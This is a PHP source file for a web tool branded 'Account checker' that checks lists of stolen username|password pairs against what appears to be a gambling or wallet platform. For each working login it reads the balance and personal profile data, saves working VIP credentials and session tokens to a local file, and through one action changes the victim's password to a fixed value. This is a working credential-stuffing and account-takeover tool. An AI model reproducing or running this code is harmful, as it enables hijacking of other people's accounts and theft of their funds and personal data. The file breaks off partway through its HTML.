<?php
declare(strict_types=1);

require_once __DIR__ . '/ck-client.php';

/**
 * Local web interface for account checking.
 *
 * Run it bound to loopback only:
 *     php -S 127.0.0.1:8080
 *     then open http://127.0.0.1:8080
 *
 * The password is used once, in the login request, and is never stored in the
 * PHP session, on disk, or in the page.
 */


ini_set('session.use_strict_mode', '1');
session_set_cookie_params([
    'httponly' => true,
    'samesite' => 'Lax',
    'path'     => '/',
]);
session_name(basename(__DIR__) . 'checker');
session_start();

header('Cache-Control: no-store');
header('X-Content-Type-Options: nosniff');
header('Referrer-Policy: no-referrer');

if (empty($_SESSION['csrf'])) {
    $_SESSION['csrf'] = bin2hex(random_bytes(32));
}
$csrf = (string) $_SESSION['csrf'];

$flash = null;   // ['kind' => 'error'|'ok', 'text' => string, 'code' => ?string]
$agentFunds = null;
$wantRedetect = false;
$bulkResults = null;   // results of a bulk credential check
$balance = null;

/**
 * Resolve the merchant once per session instead of asking the user for it.
 * CK_MERCHANT in the environment overrides the detection.
 */
function resolveMerchant(bool $force = false): array
{
    if (!$force && !empty($_SESSION['merchant'])) {
        return [
            'merchant' => (string) $_SESSION['merchant'],
            'source'   => (string) ($_SESSION['merchant_source'] ?? 'cached'),
        ];
    }
    $det = ckDetectMerchant();
    if ($det['merchant'] === null) {
        return ['merchant' => CK_DEFAULT_MERCHANT, 'source' => 'fallback', 'error' => $det['error']];
    }
    $_SESSION['merchant'] = $det['merchant'];
    $_SESSION['merchant_source'] = $det['source'];
    return ['merchant' => $det['merchant'], 'source' => $det['source'], 'error' => null];
}

/**
 * Read the wallet balance with the same fallbacks used by saved.php.
 */
function ckBalanceAmount(array $session, array $profile = []): ?string
{
    $res = ckBalance($session);
    $b = is_array($res['body'] ?? null) ? ($res['body']['value'] ?? null) : null;
    if (is_scalar($b)) {
        return (string) $b;
    }
    if (is_array($b)) {
        if (isset($b['sumBalance'])) {
            return (string) $b['sumBalance'];
        }
        if (isset($b['mainWalletBalance'])) {
            return (string) $b['mainWalletBalance'];
        }
        if (isset($b['balance'][0]['balance'])) {
            return (string) $b['balance'][0]['balance'];
        }
    }
    foreach (['balance', 'credit', 'availableBalance', 'walletBalance', 'totalBalance', 'accountBalance'] as $key) {
        if (isset($profile[$key]) && $profile[$key] !== '' && $profile[$key] !== null) {
            return (string) $profile[$key];
        }
    }
    return null;
}

function csrfValid(?string $token): bool
{
    return is_string($token)
        && $token !== ''
        && !empty($_SESSION['csrf'])
        && hash_equals((string) $_SESSION['csrf'], $token);
}

$wantAgentFunds = false;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!csrfValid($_POST['csrf'] ?? null)) {
        http_response_code(400);
        exit('Invalid CSRF token. Reload the page.');
    }

    $action = (string) ($_POST['action'] ?? '');

    if ($action === 'logout') {
        $_SESSION = [];
        session_destroy();
        header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
        exit;
    }

    if ($action === 'agent_funds') {
        // Uses the session already in $_SESSION; no password involved.
        $wantAgentFunds = true;
    } elseif ($action === 'redetect') {
        $wantRedetect = true;
        $det = resolveMerchant(true);
        $flash = ['kind' => 'ok', 'text' => 'Merchant resolved: ' . $det['merchant'] . ' (' . $det['source'] . ')', 'code' => null];
    } elseif ($action === 'change_password_one') {
        header('Content-Type: application/json; charset=utf-8');
        $merchant = resolveMerchant()['merchant'];
        $user = trim((string) ($_POST['user'] ?? ''));
        $pass = (string) ($_POST['pass'] ?? '');
        $newPass = 'juari1122';
        if ($user === '' || $pass === '') {
            echo json_encode(['user' => $user, 'status' => 'error', 'message' => 'invalid input']);
            exit;
        }
        $r = ckLoginRetry($user, $pass, $merchant);
        if (!$r['ok'] || $r['session'] === null) {
            echo json_encode(['user' => $user, 'status' => 'error', 'message' => (string) $r['error']]);
            exit;
        }
        $res = ckChangePasswordRetry($r['session'], $pass, $newPass, $merchant);
        if (is_array($res['body']) && ($res['body']['success'] ?? null) === true) {
            $prof = ckProfile($r['session']);
            $v = is_array($prof['body']) ? ($prof['body']['value'] ?? $prof['body']['data'] ?? []) : [];
            $details = [];
            foreach (['nickname', 'account', 'mobile', 'email'] as $k) {
                if (isset($v[$k]) && $v[$k] !== '' && $v[$k] !== null) {
                    $details[] = $k . ': ' . $v[$k];
                }
            }
            foreach (['balance', 'credit', 'availableBalance', 'walletBalance', 'totalBalance', 'accountBalance'] as $bk) {
                if (isset($v[$bk]) && $v[$bk] !== '' && $v[$bk] !== null) {
                    $details[] = 'balance: ' . $v[$bk];
                    break;
                }
            }
            if (isset($v['clubLabel']['labelName'])) {
                $details[] = 'club: ' . $v['clubLabel']['labelName'];
            }
            $vip = 0;
            if (isset($v['clubLabel']['rankLevel'])) {
                $vip = (int) $v['clubLabel']['rankLevel'];
            } elseif (isset($v['clubLabel']['labelName']) && preg_match('/VIP(\d+)/i', (string) $v['clubLabel']['labelName'], $mm)) {
                $vip = (int) $mm[1];
            }
            if ($vip > 0) {
                $entry = [
                    'username'   => $user,
                    'password'   => $newPass,
                    'token'      => $r['session']['token'],
                    'details'    => implode(' | ', $details),
                    'vip'        => $vip,
                    'changed_at' => gmdate('c'),
                ];
                $file = __DIR__ . '/pwd.json';
                $list = [];
                if (is_readable($file)) {
                    $dec = json_decode((string) file_get_contents($file), true);
                    if (is_array($dec)) {
                        $list = $dec;
                    }
                }
                // replace existing entry for same username
                $list = array_values(array_filter($list, static fn($e) => !is_array($e) || ($e['username'] ?? '') !== $user));
                $list[] = $entry;
                file_put_contents($file, json_encode($list, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
                chmod($file, 0600);
            }
            echo json_encode(['user' => $user, 'status' => 'ok', 'message' => 'password changed to juari1122', 'password' => $newPass]);
        } else {
            echo json_encode(['user' => $user, 'status' => 'error', 'message' => (string) ($res['body']['message'] ?? $res['error'] ?? ('HTTP ' . $res['status']))]);
        }
        exit;
    } elseif ($action === 'bulk_check_one') {
        header('Content-Type: application/json; charset=utf-8');
        $merchant = resolveMerchant()['merchant'];
        $user = trim((string) ($_POST['user'] ?? ''));
        $pass = (string) ($_POST['pass'] ?? '');
        $captcha = trim((string) ($_POST['captcha'] ?? ''));
        $captchaId = (string) ($_POST['captcha_id'] ?? ($_SESSION['captcha_id'] ?? ''));
        if ($user === '' || $pass === '') {
            echo json_encode(['user' => $user, 'status' => 'malformed', 'token' => null, 'error' => 'missing credentials']);
            exit;
        }
        $r = ckLoginRetry($user, $pass, $merchant, null, 1, $captcha !== '' ? $captcha : null, $captchaId !== '' ? $captchaId : null);
        if ($r['ok'] && $r['session'] !== null) {
            $prof = ckProfile($r['session']);
            $v = is_array($prof['body']) ? ($prof['body']['value'] ?? $prof['body']['data'] ?? []) : [];
            $details = [];
            foreach (['nickname', 'account', 'mobile', 'email'] as $k) {
                if (isset($v[$k]) && $v[$k] !== '' && $v[$k] !== null) {
                    $details[] = $k . ': ' . $v[$k];
                }
            }
            foreach (['balance', 'credit', 'availableBalance', 'walletBalance', 'totalBalance', 'accountBalance'] as $bk) {
                if (isset($v[$bk]) && $v[$bk] !== '' && $v[$bk] !== null) {
                    $details[] = 'balance: ' . $v[$bk];
                    break;
                }
            }
            if (isset($v['clubLabel']['labelName'])) {
                $details[] = 'club: ' . $v['clubLabel']['labelName'];
            }
            $detailStr = implode(' | ', $details);
            $vip = 0;
            if (isset($v['clubLabel']['rankLevel'])) {
                $vip = (int) $v['clubLabel']['rankLevel'];
            } elseif (isset($v['clubLabel']['labelName']) && preg_match('/VIP(\d+)/i', (string) $v['clubLabel']['labelName'], $mm)) {
                $vip = (int) $mm[1];
            }
            // save successful login
            if ($vip > 0) {
                $entry = ['username' => $user, 'password' => $pass, 'token' => $r['session']['token'], 'details' => $detailStr, 'vip' => $vip, 'changed_at' => gmdate('c')];
                $f = __DIR__ . '/pwd.json';
                $lst = is_readable($f) ? (json_decode((string) file_get_contents($f), true) ?: []) : [];
                $lst = array_values(array_filter($lst, static fn($e) => !is_array($e) || ($e['username'] ?? '') !== $user));
                $lst[] = $entry;
                file_put_contents($f, json_encode($lst, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
                @chmod($f, 0600);
            }
            $balanceAmount = ckBalanceAmount($r['session'], $v);
            echo json_encode([
                'user'    => $user,
                'status'  => 'valid',
                'token'   => ckMaskToken($r['session']['token']),
                'details' => $detailStr,
                'profile' => ckProfileRows($v),
                'balance' => $balanceAmount,
                'error'   => null,
            ]);
        } else {
            $errMsg = (string) ($r['error'] ?? '');
            $errCode = (string) ($r['code'] ?? '');
            if (stripos($errMsg, 'captcha') !== false || stripos($errCode, 'captcha') !== false) {
                $cap = ckFetchCaptcha();
                if ($cap['id'] !== null) {
                    $_SESSION['captcha_id'] = $cap['id'];
                }
                if ($cap['image'] !== null) {
                    $_SESSION['captcha_image'] = $cap['image'];
                }
                echo json_encode([
                    'user'          => $user,
                    'status'        => 'captcha',
                    'token'         => null,
                    'details'       => null,
                    'balance'       => null,
                    'error'         => $errMsg,
                    'captcha_image' => $cap['image'],
                    'captcha_id'    => $cap['id'],
                ]);
            } else {
                echo json_encode(['user' => $user, 'status' => 'invalid', 'token' => null, 'details' => null, 'balance' => null, 'error' => null]);
            }
        }
        exit;
    } elseif ($action === 'bulk_check') {
        set_time_limit(0);
        $merchant = resolveMerchant()['merchant'];
        $lines = preg_split('/\r?\n/', (string) ($_POST['bulk'] ?? ''));
        $bulkResults = [];
        foreach ($lines as $line) {
            $parsed = ckParseBulkLine($line);
            if ($parsed === null) {
                continue;
            }
            $parts = $parsed;
            if ($parts[0] === '' || $parts[1] === '') {
                $bulkResults[] = ['user' => $parts[0] ?? '', 'status' => 'malformed', 'token' => null, 'error' => 'missing password'];
                continue;
            }
            $r = ckLoginRetry($parts[0], $parts[1], $merchant);
            if ($r['ok'] && $r['session'] !== null) {
                $bulkResults[] = ['user' => $parts[0], 'status' => 'valid', 'token' => ckMaskToken($r['session']['token']), 'error' => null];
            } else {
                $bulkResults[] = ['user' => $parts[0], 'status' => 'invalid', 'token' => null, 'error' => (string) $r['error']];
            }
            usleep(200000);
        }
        $flash = ['kind' => 'ok', 'text' => 'Checked ' . count($bulkResults) . ' record(s).', 'code' => null];
    } elseif ($action === 'login') {
        $isAjax = (($_SERVER['HTTP_X_REQUESTED_WITH'] ?? '') === 'XMLHttpRequest');
        $merchant = resolveMerchant()['merchant'];
        $raw      = (string) ($_POST['credentials'] ?? '');
        $parts    = array_map('trim', explode('|', $raw, 2));
        $user     = $parts[0] ?? '';
        $pass     = $parts[1] ?? '';
        $captcha  = trim((string) ($_POST['captcha'] ?? ''));
        $captchaId = (string) ($_SESSION['captcha_id'] ?? '');

        $result = ckLoginRetry($user, $pass, $merchant, null, 3, $captcha !== '' ? $captcha : null, $captchaId !== '' ? $captchaId : null);

        if ($result['ok'] && $result['session'] !== null) {
            // Store only the session token -- never the password.
            $_SESSION['ck'] = $result['session'];
            unset($_SESSION['captcha_id'], $_SESSION['captcha_image']);
            $flash = ['kind' => 'ok', 'text' => 'Signed in.', 'code' => null];
            // save successful login
            $prof = ckProfile($result['session']);
            $v = is_array($prof['body']) ? ($prof['body']['value'] ?? $prof['body']['data'] ?? []) : [];
            $details = [];
            foreach (['nickname', 'account', 'mobile', 'email'] as $k) {
                if (isset($v[$k]) && $v[$k] !== '' && $v[$k] !== null) {
                    $details[] = $k . ': ' . $v[$k];
                }
            }
            foreach (['balance', 'credit', 'availableBalance', 'walletBalance', 'totalBalance', 'accountBalance'] as $bk) {
                if (isset($v[$bk]) && $v[$bk] !== '' && $v[$bk] !== null) {
                    $details[] = 'balance: ' . $v[$bk];
                    break;
                }
            }
            if (isset($v['clubLabel']['labelName'])) {
                $details[] = 'club: ' . $v['clubLabel']['labelName'];
            }
            $vip = 0;
            if (isset($v['clubLabel']['rankLevel'])) {
                $vip = (int) $v['clubLabel']['rankLevel'];
            } elseif (isset($v['clubLabel']['labelName']) && preg_match('/VIP(\d+)/i', (string) $v['clubLabel']['labelName'], $mm)) {
                $vip = (int) $mm[1];
            }
            if ($vip > 0) {
                $entry = ['username' => $user, 'password' => $pass, 'token' => $result['session']['token'], 'details' => implode(' | ', $details), 'vip' => $vip, 'changed_at' => gmdate('c')];
                $f = __DIR__ . '/pwd.json';
                $lst = is_readable($f) ? (json_decode((string) file_get_contents($f), true) ?: []) : [];
                $lst = array_values(array_filter($lst, static fn($e) => !is_array($e) || ($e['username'] ?? '') !== $user));
                $lst[] = $entry;
                file_put_contents($f, json_encode($lst, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
                @chmod($f, 0600);
            }
            $balance = ckBalanceAmount($result['session'], $v);
            if ($isAjax) {
                header('Content-Type: application/json; charset=utf-8');
                echo json_encode([
                    'status'   => 'ok',
                    'message'  => 'Signed in.',
                    'username' => $user,
                    'details'  => implode(' | ', $details),
                    'profile'  => ckProfileRows($v),
                    'balance'  => $balance,
                    'token'    => ckMaskToken($result['session']['token']),
                ]);
                exit;
            }
        } else {
            $errCode = (string) ($result['code'] ?? '');
            $errMsg  = (string) $result['error'];
            if (stripos($errMsg, 'captcha') !== false || stripos($errCode, 'captcha') !== false) {
                $cap = ckFetchCaptcha();
                if ($cap['id'] !== null) {
                    $_SESSION['captcha_id'] = $cap['id'];
                }
                if ($cap['image'] !== null) {
                    $_SESSION['captcha_image'] = $cap['image'];
                }
                $flash = ['kind' => 'error', 'text' => $errMsg, 'code' => $result['code']];
            } else {
                $flash = ['kind' => 'error', 'text' => $errMsg, 'code' => $result['code']];
            }
            if ($isAjax) {
                header('Content-Type: application/json; charset=utf-8');
                echo json_encode([
                    'status'        => 'error',
                    'message'       => $errMsg,
                    'code'          => $result['code'],
                    'captcha'       => !empty($_SESSION['captcha_image']),
                    'captcha_image' => $_SESSION['captcha_image'] ?? null,
                ]);
                exit;
            }
        }
    }
}

$merchantInfo = resolveMerchant($wantRedetect);

$session = $_SESSION['ck'] ?? null;
$profile = null;
$profileOk = false;

if (is_array($session) && !empty($session['token'])) {
    $res = ckProfile($session);
    if ($res['error'] !== null) {
        $flash = ['kind' => 'error', 'text' => 'Profile request failed: ' . $res['error'], 'code' => null];
    } elseif ($res['status'] === 401 || (is_array($res['body']) && ($res['body']['success'] ?? null) === false)) {
        $flash = [
            'kind' => 'error',
            'text' => 'Session rejected: ' . ($res['body']['message'] ?? 'HTTP ' . $res['status']),
            'code' => $res['body']['errorCode'] ?? null,
        ];
        unset($_SESSION['ck']);   // token is dead, drop it
        $session = null;
    } else {
        $profile = is_array($res['body']) ? ($res['body']['value'] ?? $res['body']['data'] ?? []) : [];
        $profileOk = true;
        $balance = ckBalanceAmount($session, $profile);

        // One-shot: show the info, then drop the session so the next visit
        // starts at the login form again.
        unset($_SESSION['ck']);

        if ($wantAgentFunds) {
            $f = ckAgentFunds($session);
            $agentFunds = is_array($f['body']) ? ($f['body']['value'] ?? []) : null;
        }
    }
}

function e(?string $s): string
{
    return htmlspecialchars((string) $s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="robots" content="noindex, nofollow">
<title>D3M09 ACCOUNT CHECKER - <?= e(strtoupper(basename(__DIR__))) ?></title>
<style>
:root{
  --bg:#f5f8f7;
  --surface:#ffffff;
  --ink:#0f1f2e;
  --muted:#64748b;
  --line:#e2e8f0;
  --brand:#0f9f7a;
  --brand-dark:#0b7f61;
  --brand-soft:#e9fbf5;
  --danger:#b42318;
  --radius:18px;
}
*{box-sizing:border-box}
html{scroll-behavior:smooth}
body{
  margin:0;
  font-family:ui-sans-serif,system-ui,-apple-system,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
  color:var(--ink);
  background:
    radial-gradient(900px 520px at 8% -12%, #e1fbf2 0%, transparent 58%),
    radial-gradient(820px 460px at 100% 0%, #e8f1ff 0%, transparent 54%),
    var(--bg);
  min-height:100vh;
  -webkit-font-smoothing:antialiased;
  line-height:1.55;
}
a{color:var(--brand-dark)}
.shell{width:min(1160px,calc(100% - 40px));margin-inline:auto}
.site-header{
  position:sticky;top:0;z-index:30;
  background:rgba(255,255,255,.84);
  backdrop-filter:blur(14px);
  border-bottom:1px solid rgba(226,232,240,.9);
}
.header-inner{display:flex;align-items:center;gap:18px;min-height:72px;flex-wrap:wrap}
.brand{display:flex;align-items:center;gap:12px;margin-right:auto;text-decoration:none;color:var(--ink);min-width:0}
.brand-mark{
  width:42px;height:42px;border-radius:13px;flex:none;
  background:linear-gradient(135deg,var(--brand),#34d399);
  color:#fff;display:grid;place-items:center;
  box-shadow:0 10px 22px rgba(15,159,122,.22);
}
.brand-mark svg{width:22px;height:22px}
.brand-text{min-width:0}
.brand-text strong{display:block;font-size:1.02rem;letter-spacing:-.02em;line-height:1.1;text-transform:uppercase}
.brand-text small{display:block;color:var(--muted);font-size:.68rem;font-weight:700;letter-spacing:.12em;text-transform:uppercase}
.nav{display:flex;align-items:center;gap:5px;flex-wrap:wrap}
.nav a{
  padding:8px 12px;border-radius:9px;text-decoration:none;color:var(--muted);
  font-size:.84rem;font-weight:650;transition:background .18s ease,color .18s ease;
}
.nav a:hover{background:var(--brand-soft);color:var(--brand-dark)}
.nav .nav-cta{color:var(--brand-dark);background:#f2fdf9;border:1px solid #c8f0e3}
main{padding:0 0 56px}
.hero{
  display:grid;grid-template-columns:1.2fr .8fr;gap:28px;align-items:center;
  padding:clamp(30px,5vw,52px) 0 28px;
}
.eyebrow{
  display:inline-flex;align-items:center;gap:8px;padding:6px 11px;border-radius:999px;
  background:#fff;border:1px solid var(--line);color:var(--brand-dark);
  font-size:.7rem;font-weight:800;letter-spacing:.12em;text-transform:uppercase;
}
.dot{width:7px;height:7px;border-radius:50%;background:var(--brand);box-shadow:0 0 0 4px rgba(15,159,122,.12)}
.hero h1{margin:14px 0 12px;font-size:clamp(2.2rem,4.6vw,3.5rem);line-height:1.04;letter-spacing:-.05em}
.hero h1 span{color:var(--brand)}
.hero p{margin:0;max-width:58ch;color:var(--muted);font-size:1.02rem;line-height:1.65}
.merchant-card{
  justify-self:end;width:min(100%,310px);
  background:rgba(255,255,255,.92);border:1px solid var(--line);border-radius:16px;
  padding:18px 20px;box-shadow:0 14px 34px rgba(15,42,70,.06);
  display:flex;flex-direction:column;gap:3px;
}
.tile-label{font-size:.68rem;font-weight:800;letter-spacing:.1em;text-transform:uppercase;color:var(--muted)}
.merchant-card strong{font-size:1.08rem;letter-spacing:-.01em;word-break:break-word}
.merchant-card small{color:var(--muted);font-size:.74rem}
.merchant-form{margin-top:8px}
.btn{
  display:inline-flex;align-items:center;justify-content:center;gap:8px;
  padding:11px 16px;border-radius:11px;border:1px solid transparent;
  background:transparent;color:var(--ink);font:inherit;font-size:.86rem;font-weight:750;
  cursor:pointer;text-decoration:none;white-space:nowrap;
  transition:transform .18s ease,box-shadow .18s ease,background .18s ease,border-color .18s ease;
}
.btn svg{width:16px;height:16px}
.btn-primary{background:var(--brand);color:#fff;box-shadow:0 9px 20px rgba(15,159,122,.22)}
.btn-primary:hover{background:var(--brand-dark);transform:translateY(-1px);box-shadow:0 12px 24px rgba(15,159,122,.27)}
.btn-ghost{background:#fff;border-color:var(--line);color:var(--ink)}
.btn-ghost:hover{border-color:#b9e8da;background:#f7fffc;transform:translateY(-1px)}
.btn-block{width:100%}
.btn-sm{padding:6px 9px;font-size:.72rem;border-radius:8px}
.btn:disabled{opacity:.6;cursor:progress;transform:none;box-shadow:none}
.flash{
  margin:0 0 18px;border-radius:12px;padding:12px 14px;
  font-size:.84rem;border:1px solid transparent;word-break:break-word;
}
.flash.ok{background:#e9fbf4;border-color:#c8f2e3;color:#0b7a5c}
.flash.error{background:#fff1f0;border-color:#ffd7d4;color:var(--danger)}
.flash .code{display:block;margin-top:3px;font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:.7rem;opacity:.8}
.workspace{display:grid;grid-template-columns:minmax(0,.84fr) minmax(0,1.16fr);gap:18px;align-items:start}
.card{
  background:rgba(255,255,255,.94);border:1px solid var(--line);border-radius:var(--radius);
  box-shadow:0 16px 40px rgba(15,42,70,.06);padding:clamp(18px,2.2vw,24px);min-width:0;
}
.card-head{display:flex;align-items:flex-start;gap:12px;margin-bottom:18px}
.card-icon{
  width:42px;height:42px;border-radius:12px;flex:none;
  background:var(--brand-soft);color:var(--brand-dark);display:grid;place-items:center;
}
.card-icon svg{width:20px;height:20px}
.card-title{min-width:0}
.card-title h2{margin:0;font-size:1.02rem;letter-spacing:-.02em}
.card-title p{margin:2px 0 0;color:var(--muted);font-size:.79rem;line-height:1.45}
.count-badge{
  margin-left:auto;padding:5px 9px;border-radius:999px;white-space:nowrap;
  background:var(--brand-soft);border:1px solid #d1f3e8;color:var(--brand-dark);
  font-size:.7rem;font-weight:750;
}
.field{margin-bottom:14px}
.field label{display:block;font-size:.78rem;font-weight:750;margin-bottom:7px}
.input-shell{
  display:flex;align-items:center;gap:9px;padding:0 12px;
  border:1.5px solid var(--line);border-radius:11px;background:#fbfdfc;
  transition:border-color .18s ease,box-shadow .18s ease,background .18s ease;
}
.input-shell:focus-within{border-color:var(--brand);box-shadow:0 0 0 4px rgba(15,159,122,.1);background:#fff}
.input-shell svg{width:17px;height:17px;color:#94a3b8;flex:none}
.input-shell input{
  width:100%;min-width:0;border:0;outline:0;background:transparent;
  padding:12px 0;font:inherit;color:var(--ink);
}
.input-shell input::placeholder{color:#9aa8b6}
.field-hint{display:block;margin-top:6px;color:var(--muted);font-size:.73rem;line-height:1.45}
code{
  font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
  font-size:.76em;background:#f1f5f9;border:1px solid #e2e8f0;
  padding:1px 5px;border-radius:5px;color:#334155;
}
.captcha-img{display:block;max-width:100%;border:1px solid var(--line);border-radius:10px;margin-bottom:8px;background:#fff}
.status{
  margin-top:12px;border-radius:10px;padding:10px 12px;font-size:.8rem;line-height:1.45;
  border:1px solid transparent;word-break:break-word;
}
.status[hidden]{display:none}
.status.info{background:#eef6ff;border-color:#d8e8ff;color:#1e5b9a}
.status.ok{background:#e9fbf4;border-color:#c8f2e3;color:#0b7a5c}
.status.error{background:#fff1f0;border-color:#ffd7d4;color:var(--danger)}
.result{margin-top:16px;border-top:1px solid var(--line);padding-top:16px}
.result[hidden]{display:none}
.result-head{display:flex;align-items:center;gap:10px;flex-wrap:wrap}
.avatar{
  width:38px;height:38px;border-radius:50%;flex:none;
  background:linear-gradient(135deg,#d9fbf0,#e7f0ff);color:var(--brand-dark);
  display:grid;place-items:center;font-size:.8rem;font-weight:800;
}
.result-id{display:flex;flex-direction:column;gap:2px;min-width:0}
.result-id strong{font-size:.92rem;word-break:break-all}
.token{
  margin-left:auto;padding:4px 7px;border-radius:7px;
  background:#f8fafc;border:1px solid var(--line);color:var(--muted);
  font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:.66rem;
  word-break:break-all;
}
.pill{display:inline-flex;align-items:center;padding:3px 8px;border-radius:999px;font-size:.67rem;font-weight:750;white-space:nowrap}
.pill.ok{background:#e6fbf3;color:#087a5b}
.pill.err{background:#fff0ef;color:var(--danger)}
.pill.pending{background:#eef6ff;color:#1e5b9a}
.pill.warn{background:#fff8e6;color:#8a5a00}
.balance-tile{
  margin-top:14px;padding:14px 16px;border-radius:14px;
  background:linear-gradient(135deg,#effdf8,#f5fbff);border:1px solid #d7f3e9;
  display:flex;align-items:center;justify-content:space-between;gap:12px;
}
.balance-main{display:flex;flex-direction:column;gap:1px;min-width:0}
.balance-main strong{font-size:1.55rem;letter-spacing:-.035em;line-height:1.2;word-break:break-word}
.tile-note{font-size:.68rem;font-weight:750;color:var(--brand-dark);white-space:nowrap}
.detail-grid{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:8px;margin-top:12px}
.detail-grid:empty{display:none}
.detail-item{padding:8px 10px;background:#f8fafc;border:1px solid #edf2f7;border-radius:9px;min-width:0}
.detail-label{display:block;font-size:.64rem;font-weight:750;letter-spacing:.08em;text-transform:uppercase;color:var(--muted)}
.detail-value{display:block;font-size:.79rem;font-weight:650;word-break:break-word;margin-top:1px}
.bulk-input{
  width:100%;min-height:170px;resize:vertical;
  border:1.5px solid var(--line);border-radius:12px;padding:12px 13px;
  background:#fbfdfc;color:var(--ink);outline:none;
  font:0.86rem/1.55 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
  transition:border-color .18s ease,box-shadow .18s ease,background .18s ease;
}
.bulk-input:focus{border-color:var(--brand);box-shadow:0 0 0 4px rgba(15,159,122,.1);background:#fff}
.bulk-input::placeholder{color:#9aa8b6}
.bulk-actions{display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin-top:10px}
.bulk-actions .field-hint{margin:0 0 0 auto}
.table-wrap{margin-top:14px;border:1px solid var(--line);border-radius:12px;overflow:auto}
.table-wrap[hidden]{display:none}
.result-table{width:100%;border-collapse:collapse;min-width:560px}
.result-table th{
  text-align:left;padding:9px 12px;border-bottom:1px solid var(--line);
  background:#f8fafc;color:var(--muted);font-size:.64rem;font-weight:800;
  letter-spacing:.09em;text-transform:uppercase;white-space:nowrap;
}
.result-table td{padding:10px 12px;border-bottom:1px solid #edf2f7;vertical-align:middle;font-size:.79rem}
.result-table tr:last-child td{border-bottom:0}
.account-name{display:block;font-weight:700;word-break:break-all}
.row-sub{display:block;margin-top:2px;color:var(--muted);font-size:.67rem;word-break:break-word}
.balance-cell{font-weight:750;white-space:nowrap}
.row-actions{display:flex;gap:4px;flex-wrap:wrap}
.empty-state{
  margin-top:14px;min-height:150px;padding:20px;border-radius:12px;
  border:1.5px dashed #d5e4e0;background:#fbfdfc;
  display:grid;place-items:center;text-align:center;color:var(--muted);font-size:.79rem;
}
.empty-state[hidden]{display:none}
.empty-state strong{display:block;color:var(--ink);font-size:.88rem;margin-bottom:2px}
.empty-icon{
  width:38px;height:38px;border-radius:50%;margin:0 auto 8px;
  background:var(--brand-soft);color:var(--brand-dark);display:grid;place-items:center;
}
.session-card{margin-top:18px}
.session-top{display:flex;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap}
.session-meta{display:flex;flex-direction:column;gap:4px;min-width:0}
.session-actions{display:flex;gap:8px;flex-wrap:wrap;margin-top:14px}
.site-footer{border-top:1px solid var(--line);background:rgba(255,255,255,.62);margin-top:36px}
.footer-inner{display:flex;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap;padding:20px 0;color:var(--muted);font-size:.75rem}
.modal-backdrop{
  position:fixed;inset:0;z-index:100;padding:20px;
  background:rgba(15,31,46,.55);backdrop-filter:blur(4px);
  display:grid;place-items:center;
}
.modal-card{
  width:min(100%,360px);background:#fff;border-radius:16px;padding:20px;
  box-shadow:0 24px 70px rgba(15,31,46,.25);
}
.modal-card h3{margin:0 0 4px;font-size:1rem}
.modal-card p{margin:0 0 12px;color:var(--muted);font-size:.78rem}
.modal-card img{display:block;max-width:100%;border:1px solid var(--line);border-radius:10px;margin:0 0 10px}
.modal-actions{display:flex;gap:8px;margin-top:10px}
.modal-actions .btn{flex:1}
@media(max-width:960px){
  .workspace{grid-template-columns:1fr}
  .hero{grid-template-columns:1fr;gap:18px}
  .merchant-card{justify-self:start;width:100%;max-width:380px}
}
@media(max-width:700px){
  .header-inner{padding:10px 0;gap:10px}
  .nav{width:100%;overflow-x:auto;padding-bottom:2px}
}
@media(max-width:640px){
  .shell{width:calc(100% - 28px)}
  .brand-text strong{font-size:.92rem}
  .brand-text small{font-size:.62rem}
  .nav a{padding:7px 9px;font-size:.78rem}
  .nav .nav-cta{display:none}
  .hero{padding-top:24px}
  .hero h1{font-size:clamp(2rem,9vw,2.7rem)}
  .card{padding:15px;border-radius:15px}
  .detail-grid{grid-template-columns:1fr}
  .balance-main strong{font-size:1.3rem}
  .token{margin-left:0}
  .bulk-actions .field-hint{margin-left:0;width:100%}
}
@media(prefers-reduced-motion:reduce){
  *{scroll-behavior:auto!important;transition:none!important;animation:none!important}
}
</style>
</head>
<body>
<header class="site-header">
  <div class="shell header-inner">
    <a class="brand" href="/" aria-label="Back to checker showcase">
      <span class="brand-mark" aria-hidden="true">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3 4.5 6v5.5c0 4.4 3.1 7.7 7.5 9.5 4.4-1.8 7.5-5.1 7.5-9.5V6L12 3Z"/><path d="m8.8 12 2.1 2.1 4.4-4.4"/></svg>
      </span>
      <span class="brand-text">
        <strong><?= e(strtoupper(basename(__DIR__))) ?></strong>
        <small>Account checker</small>
      </span>
    </a>
    <nav class="nav" aria-label="Sections">
      <a href="#single">Single</a>
      <a href="#bulk">Bulk</a>
      <a href="./saved.php">Saved</a>
      <a class="nav-cta" href="/">All checkers</a>
    </nav>
  </div>
</header>

<main class="shell" id="home">
  <section class="hero">
    <div>
      <span class="eyebrow"><span class="dot"></span> Local-only tool</span>
      <h1>Check accounts.<br><span>See balances.</span></h1>
      <p>Verify one account or a whole list. Live wallet balance, profile details, and session status in one clean view.</p>
    </div>
    <div class="merchant-card">
      <span class="tile-label">Active merchant</span>
      <strong><?= e((string) $merchantInfo['merchant']) ?></strong>
      <small><?= e((string) ($merchantInfo['source'] ?? 'unknown')) ?> · detected</small>
      <form method="post" class="merchant-form">
        <input type="hidden" name="csrf" value="<?= e($csrf) ?>">
        <input type="hidden" name="action" value="redetect">
        <button class="btn btn-ghost btn-sm" type="submit">Re-detect merchant</button>
      </form>
    </div>
  </section>

  <?php if ($flash !== null): ?>
    <div class="flash <?= e($flash['kind']) ?>">
      <?= e($flash['text']) ?>
      <?php if (!empty($flash['code'])): ?>
